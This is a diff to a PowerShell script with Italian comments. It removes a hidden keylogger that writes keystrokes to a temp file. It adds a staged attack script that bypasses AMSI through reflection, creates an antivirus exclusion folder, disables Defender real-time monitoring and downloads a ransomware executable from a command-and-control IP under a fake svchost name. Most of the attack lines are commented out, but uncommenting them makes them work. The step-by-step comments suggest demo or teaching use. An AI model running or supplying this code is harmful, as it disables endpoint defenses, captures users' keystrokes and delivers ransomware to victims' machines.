@@ -1,17 +1,28 @@
-$t = [Type]::GetType("System.Management.Automation.Utils")
-$f = $t.GetField("helpHelpers", "NonPublic,Static")
-$m = [Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
-$k = {
-    $api = [Type]::GetType("Microsoft.Win32.Win32Native")
-    while($true) {
-        for($i=8; $i -le 255; $i++) {
-            # Uso della Reflection per invocare GetAsyncKeyState senza DllImport
-            if([user32]::GetAsyncKeyState($i) -eq -32767) {
-                $c = [char]$i
-                "Premuto: $c" | Out-File "$env:TEMP\log.txt" -Append
-            }
-        }
-        Start-Sleep -Milliseconds 100
-    }
-}
-powershell -WindowStyle Hidden -Command $k
+
+Write-Host "[*] Avvio fase di atterraggio..."
+
+# 1. AMSI BYPASS (Accecamento dell'Antivirus in memoria)
+# Questa tecnica usa la "Reflection" per ingannare Windows e fargli credere
+# che il servizio di scansione antimalware sia andato in crash.
+Write-Host "[*] Patching AMSI in corso..."
+$Class = 'System.Management.Automation.AmsiUtils'
+$Field = 'amsiInitFailed'
+# [Ref].Assembly.GetType($Class).GetField($Field,'NonPublic,Static').SetValue($null,$true)
+
+# 2. DISATTIVAZIONE DEFENDER E CREAZIONE ZONA FRANCA
+# L'attaccante ha bisogno di una cartella dove l'antivirus non guarderà mai,
+# e per sicurezza cerca di spegnere il controllo in tempo reale.
+Write-Host "[*] Riconfigurazione policy di sicurezza OS..."
+$BlindSpot = "C:\Users\Public\TempPayloads"
+New-Item -ItemType Directory -Force -Path $BlindSpot | Out-Null
+
+# Se eseguiti come Amministratore, questi comandi lasciano il PC indifeso:
+# Set-MpPreference -DisableRealtimeMonitoring $true
+# Set-MpPreference -ExclusionPath $BlindSpot
+
+# 3. DOWNLOAD DEL VERO PAYLOAD (Ora che le difese sono spente)
+Write-Host "[*] Difese abbassate. Download payload di secondo stadio..."
+$C2_URL = "http://192.168.100.55/hidden_ransomware.exe"
+# Invoke-WebRequest -Uri $C2_URL -OutFile "$BlindSpot\svchost_fake.exe"
+
+Write-Host "[+] Sistema compromesso. Passo la palla al payload."
